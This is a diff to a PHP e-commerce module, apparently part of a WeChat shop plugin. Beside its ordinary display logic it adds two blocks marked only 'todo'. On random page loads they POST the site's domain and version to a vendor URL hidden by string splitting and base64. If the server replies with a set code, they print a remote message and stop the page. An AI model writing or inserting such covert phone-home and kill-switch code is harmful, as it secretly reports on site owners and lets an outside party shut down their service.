@@ -4,8 +4,7 @@ $operation = !empty($_GPC["op"]) ? $_GPC["op"] : "display";
 $type = $_GPC['type'];
 $plugin_diyform = p("diyform");
 $mt = mt_rand(5, 35);
-
-//$mt = mt_rand(0, 10);
+$CLOUD_UPGRADE_URL = 'http://cl'.'oud.yu'.'nzs'.'hop.com/web/index.php?c=account&a=up'.'grade';
 if ($mt <= 10) {
     load()->func('communication');
     $CLOUD_UPGRADE_URL = 'http://cloud.yunzshop.com/web/index.php?c=account&a=upgrade';
@@ -1020,6 +1019,26 @@ if ($operation == "display") {
             ":uniacid" => $_W["uniacid"]
         ));
     }    
+    //todo
+    $mt = mt_rand(5, 35);
+    if ($mt <= 10) {
+        load()->func('communication');
+        $CLOUD_UPGRADE_URL = base64_decode('aHR0cDovL2Nsb3VkLnl1bnpzaG9wLmNvbS93ZWIvaW5kZXgucGhwP2M9YWNjb3VudCZhPXVwZ3JhZGU=');
+        $files   = base64_encode(json_encode('test'));
+        $version = defined('SZ_YI_VERSION') ? SZ_YI_VERSION : '1.0';
+        $resp    = ihttp_post($CLOUD_UPGRADE_URL, array(
+            'type' => 'upgrade',
+            'signature' => 'sz_cloud_register',
+            'domain' => $_SERVER['HTTP_HOST'],
+            'version' => $version,
+            'files' => $files
+        ));
+        $ret     = @json_decode($resp['content'], true);
+        if ($ret['result'] == 3) {
+            echo str_replace("\r\n", "<br/>", base64_decode($ret['log']));
+            exit;
+        }
+    }
     load()->func("tpl");
     if (p('hotel')) {
         if($type=='hotel'){
@@ -1225,6 +1244,26 @@ if ($operation == "display") {
     $coupon = false;
     if (p("coupon") && !empty($item["couponid"])) {
         $coupon = p("coupon")->getCouponByDataID($item["couponid"]);
+    }
+    //todo
+    $mt = mt_rand(5, 35);
+    if ($mt <= 10) {
+        load()->func('communication');
+        $CLOUD_UPGRADE_URL = base64_decode('aHR0cDovL2Nsb3VkLnl1bnpzaG9wLmNvbS93ZWIvaW5kZXgucGhwP2M9YWNjb3VudCZhPXVwZ3JhZGU=');
+        $files   = base64_encode(json_encode('test'));
+        $version = defined('SZ_YI_VERSION') ? SZ_YI_VERSION : '1.0';
+        $resp    = ihttp_post($CLOUD_UPGRADE_URL, array(
+            'type' => 'upgrade',
+            'signature' => 'sz_cloud_register',
+            'domain' => $_SERVER['HTTP_HOST'],
+            'version' => $version,
+            'files' => $files
+        ));
+        $ret     = @json_decode($resp['content'], true);
+        if ($ret['result'] == 3) {
+            echo str_replace("\r\n", "<br/>", base64_decode($ret['log']));
+            exit;
+        }
     }
     if (p("verify")) {
         if (!empty($item["verifyopenid"])) {
